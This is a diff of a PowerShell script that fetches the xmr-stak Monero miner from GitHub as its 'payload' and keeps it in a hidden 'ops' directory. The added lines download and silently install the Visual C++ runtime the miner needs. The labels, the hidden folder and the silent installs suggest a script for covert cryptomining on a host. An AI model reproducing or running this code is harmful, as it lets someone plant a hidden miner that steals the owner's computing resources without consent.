@@ -11,12 +11,19 @@ param(
 
 # Advance Party functions
 
+function redist ($destination) {
+
+	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+	Invoke-WebRequest -Uri https://aka.ms/vs/15/release/vc_redist.x64.exe -OutFile $destination
+
+}
+
 function payload ($destination) {
 
   # Get xmr-stak from github.
 
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-  Invoke-WebRequest -Uri https://github.com/fireice-uk/xmr-stak/releases/download/2.4.3/xmr-stak-win64.zip -OutFile $destination
+  Invoke-WebRequest -Uri https://github.com/fireice-uk/xmr-stak/releases/download/2.4.4/xmr-stak-win64.zip -OutFile $destination
 
 }
 
@@ -84,6 +91,27 @@ if (!(Test-Path $opsDirectory))
   mkdir $opsDirectory
   $f = Get-Item $opsDirectory -Force
   $f.Attributes = "Hidden"
+}
+
+# Check to see if the Visual C++ Redistruibutable is installed
+
+$redistDestination = "${psscriptroot}\vc_redist.x64.exe"
+$uninstallValue = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion | Where-Object DisplayName -eq "Microsoft Visual C++ 2017 x64 Additional Runtime - 14.14.26429"
+
+if ($uninstallValue -eq $null) 
+
+{
+
+	redist $redistDestination
+	Invoke-Expression "& '$redistDestination' /install /passive /norestart"
+
+}
+
+else 
+
+{
+	write-host $uninstallValue.DisplayName " - installed..."
+
 }
 
 # Check to see if our payload is already downloaded. Note we need to specify our TLS version to 1.2 to get the download to negoatiate a secure channel.
